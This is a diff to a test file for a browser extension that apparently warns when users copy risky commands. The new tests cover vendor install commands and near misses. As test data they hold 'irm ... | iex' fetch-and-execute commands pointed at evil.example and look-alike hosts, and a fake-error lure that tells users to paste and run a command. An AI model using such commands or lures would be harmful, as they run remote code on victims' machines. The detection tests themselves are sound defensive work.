@@ -159,6 +159,9 @@ function run(options) {
     conversationHost: !!opts.conversationHost,
     /* Likewise, false unless a test asks for a search engine's results page. */
     searchResultsHost: !!opts.searchResultsHost,
+    /* The engine's own host reducer, declared above the slice. */
+    regDomain: (h) => String(h || '').replace(/^www\./, '').toLowerCase(),
+    URL,
     log(type, detail) { logs.push({ type, detail }); },
     woOn(target, type, fn) { listeners[type] = fn; },
     woObserve(fn) { observers.push(fn); return { disconnect() {} }; },
@@ -562,6 +565,44 @@ async function check(name, fn) {
       assert.strictEqual(runtime.body.children.length, 0, 'showed a panel on an install page: ' + page);
       assert.strictEqual(runtime.writes.length, 1, 'blocked an ordinary copy on: ' + page);
     }
+  });
+
+  /* ollama.com/download/windows: a copy button beside "irm https://ollama.com/install.ps1 | iex", and no
+     instructions at all. A vendor's own install line, shown as it is copied, from its own address. */
+  const OWN_INSTALL = (host) => cmd('i', 'rm https://', host, '/install.ps1 | i', 'ex');
+  const VENDOR_PAGE = (command) => 'Download Ollama\nGet started by installing Ollama.\nInstall\nmacOS\nLinux\nWindows\n'
+    + command + '\nDownload manually';
+  await check('a vendor\'s own install command, copied from its own page, does not warn', async () => {
+    const runtime = run({ page: 'https://ollama.com/download/windows', body: VENDOR_PAGE(OWN_INSTALL('ollama.com')), userActivated: true });
+    await runtime.navigator.clipboard.writeText(OWN_INSTALL('ollama.com'));
+    runtime.flushTimers();
+    assert.strictEqual(runtime.activities().length, 0, JSON.stringify(runtime.activities()));
+    assert.strictEqual(runtime.body.children.length, 0, 'a panel was raised over the vendor page');
+    assert.strictEqual(runtime.writes.length, 1);
+    const www = run({ page: 'https://www.ollama.com/download', body: VENDOR_PAGE(OWN_INSTALL('ollama.com')), userActivated: true });
+    await www.navigator.clipboard.writeText(OWN_INSTALL('ollama.com'));
+    assert.strictEqual(www.activities().length, 0, 'www. is the same host');
+  });
+  await check('near misses of the vendor exemption still warn', async () => {
+    const cases = [
+      ['a command fetching from another site', 'https://ollama.com/download', VENDOR_PAGE(OWN_INSTALL('evil.example')), OWN_INSTALL('evil.example')],
+      ['a look-alike host', 'https://ollama.com/download', VENDOR_PAGE(OWN_INSTALL('ollama.com.evil.example')), OWN_INSTALL('ollama.com.evil.example')],
+      ['a command the page does not show', 'https://ollama.com/download', VENDOR_PAGE('Click copy to install'), OWN_INSTALL('ollama.com')],
+      ['plain http', 'https://ollama.com/download', VENDOR_PAGE(cmd('i', 'rm http://ollama.com/install.ps1 | i', 'ex')),
+        cmd('i', 'rm http://ollama.com/install.ps1 | i', 'ex')],
+      ['a lure serving its own payload with paste steps', 'https://fix-error.example/help',
+        cmd('Something went wrong.\nPress ', WIN_RUN(), ', then press Ctrl', String.fromCharCode(43), 'V and Enter.\n', OWN_INSTALL('fix-error.example')),
+        OWN_INSTALL('fix-error.example')],
+    ];
+    for (const [name, page, body, copied] of cases) {
+      const runtime = run({ page, body, userActivated: true });
+      try { await runtime.navigator.clipboard.writeText(copied); } catch (_) { /* a refused write is also a warning */ }
+      runtime.flushTimers();
+      assert(runtime.activities().length > 0, 'no warning for ' + name);
+    }
+    const scripted = run({ page: 'https://ollama.com/download', body: VENDOR_PAGE(OWN_INSTALL('ollama.com')) });
+    await assert.rejects(scripted.navigator.clipboard.writeText(OWN_INSTALL('ollama.com')), /Blocked by WardenOne/,
+      'a copy nobody pressed is still refused, even of the page\'s own command');
   });
 
   await check('a documentation host suppresses instruction-only noise', () => {
